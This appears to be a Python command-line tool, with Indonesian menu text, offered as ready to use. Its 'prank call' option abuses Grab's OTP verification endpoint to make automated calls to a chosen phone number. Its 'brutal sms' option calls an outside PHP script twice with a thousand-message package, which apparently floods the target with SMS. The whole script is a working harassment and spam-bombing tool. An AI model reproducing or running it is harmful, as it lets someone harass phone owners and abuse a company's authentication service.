import time, os, urllib, requests

d1 = '\033[1;90m'
r1 = '\033[1;91m'
g1 = '\033[1;92m'
y1 = '\033[1;93m'
b1 = '\033[1;94m'
p1 = '\033[1;95m'
c1 = '\033[1;96m'
w1 = '\033[1;97m'
d0 = '\033[0;90m'
r0 = '\033[0;91m'
g0 = '\033[0;92m'
y0 = '\033[0;93m'
b0 = '\033[0;94m'
p0 = '\033[0;95m'
c0 = '\033[0;96m'
w0 = '\033[0;97m'
re = '\033[0;0m'

def logo():
	os.system("clear")
	print(f"""\n
{c1} _______      _ {p1}___ ___ ___
{c1} \_   _/_ ___| {re}|{p1} | |_  |   |
{c1}   | | . | . | {re}|_ {p1} |  _/ | |
{c1}   |_|___|___|___{re}|{p1}_|___|___| {d1}v1.0

   {r1}* {d0}dibuat oleh njank soekamti
     tool sederhana siap pakai
""")

def prankcall():
	print(f"""
 {c0}[+] {w0}PRANK CALL
 """)
	try:
		print(f"     {p0}contoh {c1}: {w0}6285798808125")
		tg=input(f"     {p0}target {c1}: {w0}")
		kontol = {'method':'CALL','countryCode':'id','phoneNumber':tg,'templateID':'pax_android_production'}
		ID = ("challengeID")
		EE = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=kontol)
		if str(ID) in str(EE.text):
			print(f"     {p0}status {c1}: {g1}success")
		else:
			print(f"     {p0}status {c1}: {r1}failed")
	except Exception:
		print(f"     {p0}status {c1}: {r1}koneksi error")
	input(f"\n {c0}[ {w0}back {c0}]  ");menu();inpt()

def brutal():
	print(f"     {p0}contoh {c1}: {w0}085798808125")
	print(f"              {w0}6285798808125")
	num=input(f"     {p0}target {c1}: {w0}")
	try:
		urllib.request.urlopen(f"https://sinafipika.000webhostapp.com/sms.php/sms.php?nomor={num}&paket=1000")
		urllib.request.urlopen(f"https://sinafipika.000webhostapp.com/sms.php/sms.php?nomor={num}&paket=1000")
		print(f"     {p0}status {c1}: {g1}success")
	except Exception:
		print(f"     {p0}status {c1}: {r1}failed")
	input(f"\n {c0}[ {w0}back {c0}]  ");menu();inpt()

def menu():
	logo()
	print(f" {c0}[1] {w0}prank call")
	print(f" {c0}[2] {w0}brutal sms\n")
	print(f"  {p0}[x] {w0}keluar\n")

def inpt():
	try:
		ver=['1','2','3','X','x']
		var=input(f"{re} 420 {y1}> {re}")
		while var not in ver:
			os.system("clear")
			menu()
			print(f" {r1}(!) {r0}pilihan salah ")
			var=input(f"{re} 420 {y1}> {re}")
		if var == '1':
			prankcall()
		elif var == '2':
			brutal()
		else:
			exit()
	except KeyboardInterrupt:
		exit()

menu()
inpt()
